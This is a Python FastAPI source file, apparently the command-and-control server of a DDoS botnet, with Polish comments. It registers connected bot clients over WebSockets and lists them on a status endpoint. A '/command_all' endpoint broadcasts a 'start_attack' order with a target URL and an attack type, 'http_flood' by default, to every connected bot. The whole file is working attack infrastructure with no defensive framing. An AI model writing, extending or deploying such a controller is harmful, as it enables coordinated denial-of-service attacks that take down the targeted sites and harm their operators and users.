from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import json
import asyncio

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

clients = {}

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        if client_id in clients:
            del clients[client_id]

# NOWY ENDPOINT DLA PANELU
@app.get("/status")
async def get_status():
    return {
        "online_count": len(clients),
        "clients": list(clients.keys())
    }

@app.post("/command_all")
async def send_command_all(url: str, attack_type: str = "http_flood"):
    if not clients:
        return {"status": "error", "message": "Brak klientów online"}
    
    payload = json.dumps({
        "action": "start_attack",
        "url": url,
        "attack_type": attack_type
    })
    
    tasks = [ws.send_text(payload) for ws in clients.values()]
    await asyncio.gather(*tasks)
    
    return {"status": "broadcasted", "clients_count": len(clients), "attack_type": attack_type}

# Stary endpoint (dla sprawdzenia w przeglądarce)
@app.get("/")
async def root():
    return {"online": list(clients.keys())}
